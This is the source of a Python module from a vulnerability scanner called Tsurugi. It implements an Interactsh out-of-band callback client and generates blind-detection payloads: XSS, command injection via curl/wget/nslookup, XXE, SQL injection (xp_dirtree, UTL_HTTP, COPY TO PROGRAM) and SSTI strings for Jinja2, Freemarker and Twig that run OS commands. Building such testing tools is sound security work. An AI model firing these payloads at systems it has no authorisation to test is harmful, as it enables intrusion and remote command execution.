# HikariSystem Tsurugi/core/oob.py
"""
OOB (Out-of-Band) MODULE - Interactsh Client for Blind Vulnerability Detection
Supports: DNS, HTTP, SMTP callbacks
Enhanced with AES decryption for interaction data
"""
import requests
import time
import json
import base64
import uuid
from typing import List, Optional, Dict, Any
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from core.ui import console, log_info, log_success, log_error, log_warning


class InteractshClient:
    """
    Client for Interactsh OOB interaction server.
    Handles registration, polling, and decryption of interaction data.
    """
    
    def __init__(self, server: str = "interact.sh"):
        self.server = server
        self.session = requests.Session()
        self.private_key = None
        self.public_key = None
        self.correlation_id = None
        self.secret_key = None
        self.domain = None
        self.registered = False
        
        # Interaction cache
        self._interactions: List[Dict] = []

    def generate_keys(self):
        """Generates RSA keys for Interactsh registration."""
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()

    def register(self) -> bool:
        """Registers with the Interactsh server."""
        try:
            self.generate_keys()
            
            public_key_bytes = self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            encoded_pub_key = base64.b64encode(public_key_bytes).decode()
            self.secret_key = str(uuid.uuid4())
            self.correlation_id = str(uuid.uuid4()).replace("-", "")[:20]

            register_data = {
                "public-key": encoded_pub_key,
                "secret-key": self.secret_key,
                "correlation-id": self.correlation_id
            }

            headers = {"Content-Type": "application/json"}
            
            resp = self.session.post(
                f"https://{self.server}/register", 
                json=register_data, 
                timeout=15
            )

            if resp.status_code == 200:
                self.domain = f"{self.correlation_id}.{self.server}"
                self.registered = True
                log_success(f"OOB Interaction Initialized! Domain: {self.domain}")
                return True
            else:
                log_error(f"Failed to register with Interactsh: {resp.status_code}")
                return False

        except requests.exceptions.ConnectionError:
            log_error(f"Cannot connect to {self.server}. Check internet connection.")
            return False
        except Exception as e:
            log_error(f"OOB Registration Error: {e}")
            return False

    def _decrypt_aes_key(self, encrypted_aes_key: str) -> Optional[bytes]:
        """Decrypt AES key using RSA private key."""
        if not self.private_key:
            return None
        
        try:
            encrypted_bytes = base64.b64decode(encrypted_aes_key)
            decrypted_key = self.private_key.decrypt(
                encrypted_bytes,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            return decrypted_key
        except Exception as e:
            # log_warning(f"AES key decryption failed: {e}")
            return None

    def _decrypt_data(self, encrypted_data: str, aes_key: bytes) -> Optional[str]:
        """Decrypt interaction data using AES-CFB."""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            
            # AES-CFB: first 16 bytes are IV
            if len(encrypted_bytes) < 16:
                return None
            
            iv = encrypted_bytes[:16]
            ciphertext = encrypted_bytes[16:]
            
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CFB(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            return decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            # log_warning(f"Data decryption failed: {e}")
            return None

    def poll(self) -> List[Dict[str, Any]]:
        """
        Polls for interactions and decrypts them.
        
        Returns:
            List of interaction dictionaries with fields like:
            - protocol: DNS, HTTP, SMTP
            - full-id: Full interaction ID
            - raw-request: Raw request data
            - timestamp: When interaction occurred
        """
        if not self.registered:
            return []

        try:
            url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret_key}"
            resp = self.session.get(url, timeout=10)
            
            if resp.status_code != 200:
                return []
            
            data = resp.json()
            
            # Check for encrypted data
            if 'data' not in data or not data['data']:
                return []
            
            encrypted_items = data['data']
            aes_key_encrypted = data.get('aes_key', '')
            
            # If no AES key, return raw (might be plaintext in some configs)
            if not aes_key_encrypted:
                # Try to parse as-is
                if isinstance(encrypted_items, list):
                    return encrypted_items if encrypted_items else []
                return [{"raw": str(encrypted_items)}]
            
            # Decrypt AES key
            aes_key = self._decrypt_aes_key(aes_key_encrypted)
            if not aes_key:
                # Return indication that we got data but couldn't decrypt
                return [{"encrypted_count": len(encrypted_items), "status": "key_decrypt_failed"}]
            
            # Decrypt each interaction
            decrypted_interactions = []
            for item in encrypted_items:
                try:
                    decrypted_json = self._decrypt_data(item, aes_key)
                    if decrypted_json:
                        interaction = json.loads(decrypted_json)
                        decrypted_interactions.append(interaction)
                        self._interactions.append(interaction)
                except json.JSONDecodeError:
                    # Decrypted but not valid JSON
                    decrypted_interactions.append({"raw": decrypted_json})
                except Exception:
                    continue
            
            return decrypted_interactions
            
        except requests.exceptions.Timeout:
            return []
        except Exception as e:
            # log_warning(f"OOB Poll Error: {e}")
            return []

    def poll_simple(self) -> bool:
        """
        Simple poll that just checks if ANY interaction was received.
        Faster than full poll when you just need confirmation.
        
        Returns:
            True if any interaction detected, False otherwise
        """
        if not self.registered:
            return False
        
        try:
            url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret_key}"
            resp = self.session.get(url, timeout=5)
            
            if resp.status_code == 200:
                data = resp.json()
                if 'data' in data and data['data']:
                    return True
            return False
        except:
            return False

    def get_all_interactions(self) -> List[Dict]:
        """Returns all cached interactions from previous polls."""
        return self._interactions.copy()

    def get_payloads(self) -> List[str]:
        """Returns payloads using the generated OOB domain."""
        if not self.domain:
            return []
        
        return [
            # XSS payloads
            f'"><script src=//{self.domain}></script>',
            f'<img src=http://{self.domain}/x.gif>',
            f"<svg onload=fetch('http://{self.domain}')>",
            
            # Command injection
            f"curl http://{self.domain}",
            f"nslookup {self.domain}",
            f"wget http://{self.domain}",
            f"ping -c1 {self.domain}",
            
            # SSRF
            f"http://{self.domain}/ssrf",
            f"https://{self.domain}/ssrf",
            
            # XXE
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{self.domain}">]>',
        ]

    def get_sqli_payloads(self) -> List[str]:
        """Returns SQLi-specific OOB payloads."""
        if not self.domain:
            return []
        
        d = self.domain
        return [
            # MSSQL
            f"'; EXEC master..xp_dirtree '\\\\{d}\\a'--",
            f"'; EXEC master..xp_fileexist '\\\\{d}\\a'--",
            
            # MySQL (Windows UNC)
            f"' UNION SELECT 1,LOAD_FILE('\\\\\\\\{d}\\\\a'),3--",
            
            # Oracle
            f"'; SELECT UTL_INADDR.GET_HOST_ADDRESS('{d}') FROM DUAL--",
            f"'; SELECT UTL_HTTP.REQUEST('http://{d}') FROM DUAL--",
            
            # PostgreSQL
            f"'; COPY (SELECT '') TO PROGRAM 'nslookup {d}'--",
        ]

    def get_ssti_payloads(self) -> List[str]:
        """Returns SSTI-specific OOB payloads."""
        if not self.domain:
            return []
        
        d = self.domain
        return [
            # Jinja2
            f"{{{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('nslookup {d}')|attr('read')()}}}}",
            
            # Freemarker
            f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("nslookup {d}")}}',
            
            # Twig
            f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('nslookup {d}')}}}}",
        ]

    def deregister(self):
        """Deregisters from the Interactsh server."""
        if not self.registered:
            return
        
        try:
            url = f"https://{self.server}/deregister?id={self.correlation_id}&secret={self.secret_key}"
            self.session.get(url, timeout=5)
            self.registered = False
        except:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.deregister()
